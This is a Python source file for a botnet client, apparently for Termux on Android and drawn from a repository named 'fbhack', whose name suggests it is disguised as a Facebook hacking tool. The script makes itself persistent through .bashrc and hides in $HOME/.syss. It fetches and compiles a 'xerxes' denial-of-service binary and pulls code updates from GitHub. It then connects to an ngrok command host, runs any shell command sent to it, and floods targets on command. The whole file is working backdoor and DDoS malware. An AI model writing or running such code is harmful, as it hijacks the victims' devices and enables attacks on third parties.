

import socket
import urllib.request as urllib
import os
import re
import sys
import platform
from time import sleep

# arrr4


# CONNECTION INFO
ip = "0.tcp.ngrok.io"
pastebin = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/.none.ck"

# BOT SOURCE INFO
myname = ".demp.ov"




def get_xerxes():
  os.system("pkg install clang -y; gcc libs/libs.c -o libss; mv libss $HOME/.syss; chmod 777 $HOME/.syss/libss </dev/null &>/dev/null &")




def update_source():
  os.system("mkdir $HOME/.syss")
  mypwd = os.popen("echo $HOME/.syss").read()[:-1]
  url = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/.demp.ov"
  urllib.urlretrieve(url,mypwd+"/.demp.ov")



def shell(sock,cmd):
  out = os.popen(cmd).read()
  bout = bytes(out,"utf-8")
  sock.send(bout)


def persistencia():
  global mypwd
  os.system("mkdir $HOME/.syss")
  mypwd = os.popen("echo $HOME/.syss").read()[:-1]
  os.system("echo 'myloc=\"{}\"' >> $HOME/.bashrc".format(mypwd))
  os.system("echo 'python {} </dev/null &>/dev/null &' >> $HOME/.bashrc".format(mypwd+"/"+myname))

def ifnotbashrc():
  home = os.popen("echo $HOME").read()[:-1]
  print(home+"/.bashrc")
  bashrc = open(home+"/.bashrc","a")
  bashrc.close()

ifnotbashrc()


if not myname in os.popen("cat $HOME/.bashrc").read():
  persistencia()




try:
  if not "libss" in os.popen("ls -la {}".format(mypwd)).read():
    get_xerxes()
  if not myname in os.popen("ls -la {}".format(mypwd)).read():
    os.system("cp {} {}".format(myname,mypwd))
except:
  None


def i_alive():
  sock.send(b"yes")



def get_port(pastebin):
  global port
  try:
    res = urllib.urlopen(pastebin)
    html = res.read()
    port = int(html.decode("utf-8"))
  except:
    get_port(pastebin)




def conecta(ip,port):
  global sock
  try:
    sock = socket.socket()
    sock.connect((ip,port))
  except:
    print("reconecting")
    print(ip+":"+str(port))
    sleep(10)
    get_port(pastebin)
    conecta(ip,port)


def recebe(sock):
  global cmd
  global res
  try:
    res = sock.recv(1024)
    cmd = res.decode("utf-8")
    if res == b"":
      print("Error: socket desconnected. Retrying to connect...")
      if keep == False:
        mata_xerxes()
      sleep(10)
      conecta(ip,port)
  except:
    None



def get_myloc():
  global myloc
  s = os.popen("cat $HOME/.bashrc").read()
  myloc = re.findall(r"myloc=\"([\w\/?\_>\-?\.?]+)\"",s)[0]

get_myloc()

keep = False
def executa(cmd):
  global keep
  if "attack" in cmd:
    t_host = re.findall(r"attack ([\w\.]+)",cmd)[0]
    t_port = re.findall(r"attack [\w\.]+ ([\w]+)",cmd)[0]
    saida = os.popen("ps -u {}".format(user)).read()
    out = re.findall(r"([\w]+)[\/?\:?\w?\ ?]+libss",saida)
    if len(out) == 0:
      print("Attacking {} {}".format(t_host,t_port))
      print(myloc)
      os.system("{}/libss {} {} </dev/null &>/dev/null &".format(myloc,t_host,t_port))

  elif "stop" in cmd:
    print("xerxes killed!")
    mata_xerxes()

  elif "keep false" in cmd:
    print("[+] KEEP FALSE!")
    keep = False

  elif "keep true" in cmd:
    print("[+] KEEP TRUE!")
    keep = True

  elif "alive" in cmd:
    i_alive()

  elif "update" in cmd:
    update_source()

  else:
    shell(sock,cmd)
        

user = os.popen("whoami").read()[:-1]


def mata_xerxes():

  while 1:
    saida = os.popen("ps -u {}".format(user)).read()
    out = re.findall(r"([\w]+)[\/?\:?\w?\ ?]+libss",saida)
    if len(out) == 0:
      break
    for pid in out:
      os.system("kill {}".format(pid))
      out.remove(pid)


update_source()
get_port(pastebin)
conecta(ip,port)


while 1:
  try:
    print("recebendo...")
    recebe(sock)
    print("[+] recebido!")
    print(cmd)
    executa(cmd)
  except:
    print("eror while")

